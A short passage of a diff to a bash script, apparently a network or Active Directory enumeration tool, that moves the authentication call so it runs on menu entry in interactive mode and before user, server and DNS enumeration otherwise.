     if [ "${nullsess_bool}" == true ]; then
@@ -6602,6 +6619,8 @@ init_menu() {
         ;;
 
     "")
+        echo -e ""
+        authenticate
         main_menu
         ;;
 
@@ -7081,11 +7100,10 @@ main() {
     print_banner
     prepare
     print_info
-    authenticate
-    echo -e ""
     if [ "${interactive_bool}" == true ]; then
         init_menu
     else
+        authenticate
         parse_users
         parse_servers
         dns_enum
